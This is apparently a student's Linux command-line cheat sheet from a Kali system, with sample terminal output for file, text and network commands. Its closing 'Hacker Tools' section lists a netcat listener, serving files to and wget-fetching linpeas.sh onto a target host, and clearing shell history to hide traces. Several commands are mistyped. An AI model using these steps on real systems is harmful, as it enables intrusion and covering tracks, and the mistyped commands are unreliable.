# Linux Command Line
## directory traversal
1.1 pwd - Current position in a path
```bash
pwd
```
```console
┌──(kali㉿kali)-[~]
└─$ pwd         
/home/kali
```
1.2 change directory/folder
```bash
cd /your/path
```
```console
┌──(kali㉿kali)-[~]
└─$ cd /etc/                                
                                                                                                        
┌──(kali㉿kali)-[/etc]
└─$ 
```
1.3 get an overview of folders and files
```bash
tree
```
```console
┌──(kali㉿kali)-[/etc]
└─$ tree                      
.
├── adduser.conf
├── alsa
│   └── conf.d
│       ├── 10-rate-lav.conf -> /usr/share/alsa/alsa.conf.d/10-rate-lav.conf
│       ├── 10-samplerate.conf -> /usr/share/alsa/alsa.conf.d/10-samplerate.conf
│       ├── 10-speexrate.conf -> /usr/share/alsa/alsa.conf.d/10-speexrate.conf
│       ├── 50-arcam-av-ctl.conf -> /usr/share/alsa/alsa.conf.d/50-arcam-av-ctl.conf
│       ├── 50-jack.conf -> /usr/share/alsa/alsa.conf.d/50-jack.conf
│       ├── 50-oss.conf -> /usr/share/alsa/alsa.conf.d/50-oss.conf
│       ├── 50-pulseaudio.conf -> /usr/share/alsa/alsa.conf.d/50-pulseaudio.conf
│       ├── 60-a52-encoder.conf -> /usr/share/alsa/alsa.conf.d/60-a52-encoder.conf
│       ├── 60-speex.conf -> /usr/share/alsa/alsa.conf.d/60-speex.conf
│       ├── 60-upmix.conf -> /usr/share/alsa/alsa.conf.d/60-upmix.conf
│       ├── 60-vdownmix.conf -> /usr/share/alsa/alsa.conf.d/60-vdownmix.conf
│       ├── 98-usb-stream.conf -> /usr/share/alsa/alsa.conf.d/98-usb-stream.conf
│       ├── 99-pulseaudio-default.conf.example
│       └── 99-pulse.conf -> /usr/share/alsa/alsa.conf.d/pulse.conf
├── alternatives
│   ├── ABORT.7.gz -> /usr/share/postgresql/17/man/man7/ABORT.7.gz
│   ├── ALTER_AGGREGATE.7.gz -> /usr/share/postgresql/17/man/man7/ALTER_AGGREGATE.7.gz
│   ├── ALTER_COLLATION.7.gz -> /usr/share/postgresql/17/man/man7/ALTER_COLLATION.7.gz
│   ├── ALTER_CONVERSION.7.gz -> /usr/share/postgresql/17/man/man7/ALTER_CONVERSION.7.gz

```
1.4 Find a specific folder or file
```bash
find -name "target.example"
```
```console
──(kali㉿kali)-[~]
└─$ find -name "passwords.txt"
./.cache/vmware/drag_and_drop/VW0wO7/passwords.txt
./.config/google-chrome/ZxcvbnData/3/passwords.txt
./.config/chromium/ZxcvbnData/3/passwords.txt
./.local/share/Trash/files/BastionHostingCreds (2)/passwords.txt
./passwords.txt
```
1.5 Find a specific folder or file without being case sensitive
```bash
find -iname "target.example"
```
```console
┌──(kali㉿kali)-[~]
└─$ find -iname "pAssWordS.txt"
./.cache/vmware/drag_and_drop/VW0wO7/passwords.txt
./.config/google-chrome/ZxcvbnData/3/passwords.txt
./.config/chromium/ZxcvbnData/3/passwords.txt
./.local/share/Trash/files/BastionHostingCreds (2)/passwords.txt
./passwords.txt
```
1.6 Find file by type
```bash
find , -name "*conf"
```
```console
┌──(kali㉿kali)-[~]
└─$ find . -name "*.conf"      
./.cache/vmware/drag_and_drop/hKonY4/python-opgaver/etc/test.conf
./.cache/vmware/drag_and_drop/hKonY4/python-opgaver/etc/verysecret.conf
./.cache/vmware/drag_and_drop/hKonY4/python-opgaver/data/funny_config.conf
./.config/qt6ct/qt6ct.conf
./.goenv/versions/1.23.1/src/net/testdata/freebsd-usevc-resolv.conf
./.goenv/versions/1.23.1/src/net/testdata/linux-use-vc-resolv.conf
./.goenv/versions/1.23.1/src/net/testdata/large-ndots-resolv.conf
```
1.7 Find file by size where "+100M" means more than 100 Megabytes". Use "/" for root and system and "." for current folder.
```bash
find . -size +100M
```
```console
┌──(kali㉿kali)-[~]
└─$ find . -size +100M 
./google-chrome-stable_current_amd64.deb
./google-chrome-stable_current_amd64.deb.1
./.BurpSuite/burpbrowser/139.0.7258.127/chrome
```
1.8 Find files that were modified recently where "-10" means "less than 10". Use "/" for root and system and "." for current folder.
```bash
find . -mmin -10
```
```console
┌──(kali㉿kali)-[~]
└─$ find . -mmin -10
.
./JustCreatedThisFile.txt
./.local/share/gvfs-metadata/home-16b65ecb.log
./.local/share/Trash/info
./.local/share/Trash/info/JustMadeThisFolder.txt.trashinfo
./.local/share/Trash/files
./.local/share/Trash/files/JustMadeThisFolder.txt
```

## 2. list (ls)
2.1 ls (list) - shows the content in the folder you are in.
```bash
ls
```
```console
┌──(kali㉿kali)-[~]
└─$ ls    
1to100.py           fragmentation_scan.txt                    passwords.txt
AbuIshak.ovpn       google-chrome-stable_current_amd64.deb    Pictures
article.html        google-chrome-stable_current_amd64.deb.1  Public
combined.txt        mender.req                                replay_pid1882.log
Desktop             mender.txt                                Templates
```
2.2 to see hidden files and permissions
```bash
ls -la
```
```console
└─$ la -la
total 265300
drwx------ 22 kali kali      4096 Dec  4 07:32 .
drwxr-xr-x  3 root root      4096 Sep  9 06:19 ..
-rw-rw-r--  1 kali kali       262 Nov  3 14:13 1to100.py
-rw-------  1 kali kali      8302 Oct 23 07:09 AbuIshak.ovpn
-rw-rw-r--  1 kali kali     36916 Oct 27 11:59 article.html
-rw-r--r--  1 kali kali       220 Sep  9 06:19 .bash_logout
-rw-r--r--  1 kali kali      6050 Oct 30 11:22 .bashrc
-rw-r--r--  1 kali kali      3526 Sep  9 06:19 .bashrc.original
drwx------  8 kali kali      4096 Nov 16 10:51 .BurpSuite
```
2.3 to see all files in human readable format
```bash
ls -ah
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -ah
.                   .face.icon                                .pki
..                  fragmentation_scan.txt                    .profile
1to100.py           .gnupg                                    Public
AbuIshak.ovpn       .goenv                                    .pyenv
article.html        google-chrome-stable_current_amd64.deb    replay_pid1882.log
.bash_logout        google-chrome-stable_current_amd64.deb.1  .ssh
.bashrc             .ICEauthority                             .sudo_as_admin_successful
.bashrc.original    .java                                     Templates
.BurpSuite          .local                                    udp_scan.txt
.cache              mender.req                                userpass.txt
```
2.4 See file size in human readable format
```bash
ls -lh
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -lh
total 259M
-rw-rw-r-- 1 kali kali  262 Nov  3 14:13 1to100.py
-rw------- 1 kali kali 8.2K Oct 23 07:09 AbuIshak.ovpn
-rw-rw-r-- 1 kali kali  37K Oct 27 11:59 article.html
-rw-r--r-- 1 kali kali 3.6K Aug 16  2021 combined.txt
drwxr-xr-x 2 kali kali 4.0K Oct 30 11:31 Desktop
drwxr-xr-x 2 kali kali 4.0K Oct 23 06:27 Documents
drwxr-xr-x 2 kali kali 4.0K Nov 22 13:46 Downloads
-rw-r--r-- 1 kali kali 2.8K Aug  9  2021 emails.txt
```
2.5 if you want to sort with recently modified first (use -tr for reverse order)
```bash
ls -t
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -t 
udp_scan.txt            Downloads                                 extract_article.py  Pictures
fragmentation_scan.txt  google-chrome-stable_current_amd64.deb    article.html        Public
mender.txt              google-chrome-stable_current_amd64.deb.1  replay_pid1882.log  Templates
mender.req              numbers.txt                               ngrok               Videos
userpass.txt            1to100.py                                 AbuIshak.ovpn       combined.txt
passwords.txt           Desktop                                   Documents           emails.txt
users.txt               ngrok-v3-stable-linux-amd64.tgz           Music
```
2.6 Sorted with recently modified first and hidden files included (use -atr for reverse order)
```bash
ls -at
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -at
.                                         numbers.txt                      .java
.xsession-errors                          1to100.py                        .gnupg
.Xauthority                               Desktop                          .ICEauthority
.xsession-errors.old                      .bashrc                          Documents
.zsh_history                              .zshrc                           Music
udp_scan.txt                              .pyenv                           Pictures
fragmentation_scan.txt                    .goenv                           Public
```
2.7 Sorted by size, largest first (use -lSr for reverse order)
```bash
ls -lS
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -lS             
total 265164
-rw-rw-r-- 1 kali kali 117773952 Nov 11 13:52 google-chrome-stable_current_amd64.deb
-rw-rw-r-- 1 kali kali 117773952 Nov 11 13:52 google-chrome-stable_current_amd64.deb.1
-rwxr-xr-x 1 kali kali  25268408 Oct 23 17:58 ngrok
-rw-rw-r-- 1 kali kali   9322550 Oct 30 05:29 ngrok-v3-stable-linux-amd64.tgz
-rw-rw-r-- 1 kali kali   1227855 Oct 27 07:55 replay_pid1882.log
-rw-rw-r-- 1 kali kali     36916 Oct 27 11:59 article.html
-rw------- 1 kali kali      8302 Oct 23 07:09 AbuIshak.ovpn
drwxr-xr-x 2 kali kali      4096 Oct 30 11:31 Desktop
```
2.8 See all files in a folder with its subfolders and files
```bash
ls -R
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -R
.:
1to100.py      extract_article.py                        ngrok                            Templates
AbuIshak.ovpn  fragmentation_scan.txt                    ngrok-v3-stable-linux-amd64.tgz  udp_scan.txt
article.html   google-chrome-stable_current_amd64.deb    numbers.txt                      userpass.txt
combined.txt   google-chrome-stable_current_amd64.deb.1  passwords.txt                    users.txt
Desktop        JustCreatedThisFile.txt                   Pictures                         Videos
Documents      mender.req                                Public
Downloads      mender.txt                                python-opgaver
emails.txt     Music                                     replay_pid1882.log

./Desktop:

./Documents:

./Downloads:
cacert.der  chinese-names.txt.gz  >>>>>>>>> >>>>>>>>> DenneFilLiggerIDownloads.txt <<<<<<<<< <<<<<<<<<
```
2.9 Classify file types for a clear understanding. This will, for example, put an "*" at the end of files that can be executed
```bash
ls -F
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -F
1to100.py      extract_article.py                        ngrok*                           Templates/
AbuIshak.ovpn  fragmentation_scan.txt                    ngrok-v3-stable-linux-amd64.tgz  udp_scan.txt
article.html   google-chrome-stable_current_amd64.deb    numbers.txt                      userpass.txt
combined.txt   google-chrome-stable_current_amd64.deb.1  passwords.txt                    users.txt
```
## 3. Reading and inspection of files
3.1 Print all content of a file at once
```bash
cat target.file
```
```console
┌──(kali㉿kali)-[~]
└─$ cat userpass.txt 
root toor
admin password
user 123456
guest admin
```
3.2 Open a file in a "reader-mode" where you can scroll up and down (press CTRL+Z to exit the file)
```bash
less target.file
```
```console
flowers
cristian
tintin
bianca
chrisbrown
chester
101010
smokey
silver
internet
sweet
strawberry
garfield
dennis
panget
francis
cassie
benfica
love123
:
(END)
```
3.3 Read a file's first 10 lines (use -n xyz for a specific number of lines from the first line)
```bash
head target.file
```
```console
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ head rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```
3.4 Read a file's last 10 lines 
```bash
tail target.file
```
```console
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ tail rockyou.txt                        
       1234567
       1
                  
            
           
▒xCvBnM,
ie168
abygurl69
a6_123
*7¡Vamos!
```
3.5 Read a file's last 10 lines and follow live on the latest additions
```bash
tail -f target.file
```
```console
┌──(kali㉿kali)-[~]
└─$ tail -f TestFil.txt
hej
h
23
jj32j9
ksadkaskdad12283129asd
ads1237asdh92ghad
7129afladas87zxfjfaksdasdh
1283nasfdA 8AWd
sadja9fgaj
sidste
denne linje er sat på live
```
3.6 Search for specific text inside a file that matches only those lines (use -i option to search case-insensitive)
```bash
grep "søgeord" target.file
```
```console
┌──(kali㉿kali)-[~]
└─$ grep "h" TestFil.txt                       
hej
h
ads1237asdh92ghad
7129afladas87zxfjfaksdasdh
```
3.7 Find out what type a file is (used because a file can have a fake filename to hide information)
```bash
file target.file
```
```console
┌──(kali㉿kali)-[~]
└─$ file TestFil.txt
TestFil.txt: Unicode text, UTF-8 text
```
## 4. File manipulation
4.1 Output file direction with ">"
```bash
example.scan > ScanList.txt
```
```console
──(kali㉿kali)-[~]
└─$ ls -ah > fil_liste.txt 

┌──(kali㉿kali)-[~]
└─$ cat fil_liste.txt
.
..
1to100.py
AbuIshak.ovpn
article.html
.bash_logout
.bashrc
.bashrc.original
.BurpSuite
.cache
combined.txt
.config
Desktop
.dmrc
```
4.2 Add something to a file with for example echo and ">>"
```bash
echo TargetText >> TargetFile.txt                    
```
```console
┌──(kali㉿kali)-[~]
└─$ echo TargetText >> TestFil2.txt              
┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt               
Test2
Test2Fil
TestFil.txt
TargetText
```
4.3 Take the output from something on the left side and give it to something on the right with Pipe " | ". 
```bash
cat Example.file | grep "Example Text"                  
```
```console
┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt | grep "Target"
TargetText                 
```
You can for example also tail -f a file and pipe it to a grep "search word" to see if that search word is being added live to the file you are following
```bash
tail -f TestFil2.txt | grep "Important Keyword"              
```
Actually you can pipe infinitely to your own needs. Here is a pipe that first fetches data from a file, filters the data, sorts it, removes all duplicates (uniq) and finally cuts everything else and shows only the 5 top results.
```bash
cat list.txt | grep "admin" | sort | uniq | head -n 5            
```
4.3 Text editor in the command line. Use nano to manually write in a file
```bash
nano Example.File             
```
4.4 Remove or replace a character in a file
```bash
cat Example.File | tr "A" "B"                  
```
```console
┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt
Test2
Test2Fil
TestFil.txt
TargetText
GammelText

┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt | tr "G" "A"               
Test2
Test2Fil
TestFil.txt
TargetText
AammelText              
```
4.5 Replace a word with another
```bash
cat Example.File | sed 's/OldWord/NewWord/g'                  
```
```console
┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt | sed 's/GammelText/NyText/g'
Test2
Test2Fil
TestFil.txt
TargetText
NyText
```
4.6 create a new empty file
```bash
touch Example.File               
```
```console
┌──(kali㉿kali)-[~]
└─$ touch NyFil.txt  
```
4.7 copy a file
```bash
cp Example.file copy                  
```
```console
┌──(kali㉿kali)-[~]
└─$ cp NyFil.txt NyFil2.txt   
```
4.8 delete a file
```bash
rm Example.file         
```
```console
└─$ rm NyFil2.txt  
```
4.9 remove a folder and everything in it without asking permission
```bash
rm -rf Folder         
```

## 5. Network
5.1 see your IP addresses 
```bash
ip a
```
5.2 Ping a host to see if it is alive 
```bash
pink [host]
```
```console
┌──(kali㉿kali)-[~]
└─$ ping dr.dk
PING dr.dk (95.166.124.137) 56(84) bytes of data.
64 bytes from 95.166.124.137: icmp_seq=1 ttl=60 time=2.68 ms
--- dr.dk ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.679/2.679/2.679/0.000 ms
```
5.3 Secure Shell login on a remote computer, encrypted
```bash
ssh username@host
```
Can add -i if a key file should be attached to the login
5.4 Look up a domain name to find the IP address
```bash
nslookup google.com
```
```console
┌──(kali㉿kali)-[~]
└─$ nslookup google.com
Server:         192.168.1.1
Address:        192.168.1.1#53

Non-authoritative answer:
Name:   google.com
Address: 216.58.207.238
Name:   google.com
Address: 2a00:1450:400f:803::200e
```
5.5 If you want to see which route your sent packages take from your computer to the target
```bash
traceroute host
```
```console
┌──(kali㉿kali)-[~]
└─$ traceroute google.com     
traceroute to google.com (216.58.207.238), 30 hops max, 60 byte packets
 1  192.168.1.1 (192.168.1.1)  0.496 ms  0.459 ms  0.530 ms
 2  hidden
 3  hidden
 4  hidden  13.652 ms  12.857 ms  13.618 ms
 5  hidden  14.512 ms hidden  14.496 ms  14.475 ms
 6  209.85.242.83 (209.85.242.83)  15.126 ms  13.911 ms  15.923 ms
 7  arn09s19-in-f14.1e100.net (216.58.207.238)  11.719 ms  12.255 ms  11.675 ms
```
## 6. Hacker Tools
6.1 Open a "listen-port" on your own machine that waits for something to connect back to your machine
```bash
nc lvnp 4444        
```
```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444    
listening on [any] 4444 ...
```
6.2 Turn a folder into a website and download your files from target host
```bash
pyton3 -m http.server [port]      
```
6.3 Download used on target host to fetch files from your machine
```bash
wget http://10.10.10.5:8000/linpeas.sh   
```
6.4 Make a file runnable, for example a malicious text file that becomes a script after it is made runnable
```bash
chmod +x exploit.sh
```
6.5 Clear the terminal's memory and log out so there are fewer traces of your visit on the target host
```bash
history -c && exit
```
